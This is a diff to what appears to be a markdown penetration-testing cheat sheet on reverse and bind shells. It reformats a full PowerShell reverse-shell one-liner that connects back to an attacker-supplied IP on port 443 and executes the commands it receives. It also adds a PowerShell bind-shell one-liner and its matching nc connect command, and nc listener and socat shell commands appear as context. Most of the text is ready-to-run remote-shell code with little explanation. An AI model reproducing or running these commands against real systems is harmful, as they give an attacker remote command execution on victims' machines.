@@ -51,8 +51,11 @@ Victim connnects and attacker listens. Used 95% of the time.
 
 - powershell
 	- attacker runs: `nc -nlvp 443`
-	- victim runs on cmd prompt: ```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP-ADDRESS',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"```
-	-  
+	- victim runs on cmd prompt: 
+```powershell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP-ADDRESS',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+ 
 ## Bind Shells
 Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".
 
@@ -65,6 +68,13 @@ Victim listens and attacker connects. Useful when bypassing firewalls or when re
 	- victim runs (windows): `socat -d -d TCP4-LISTEN:443 EXEC:cmd.exe,pipes`
 	- attacker runs: `socat - TCP4:{ip-address}:4444`
 
+- powershell
+	- victim runs: 
+```powershell
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+```
+	- attacker runs: `nc -nv {ip-address} 443`
+	
 ## Encrypted shells with OpenSSL & Socat
 Utilize SSL certificates to encrypt data sent between hosts
 
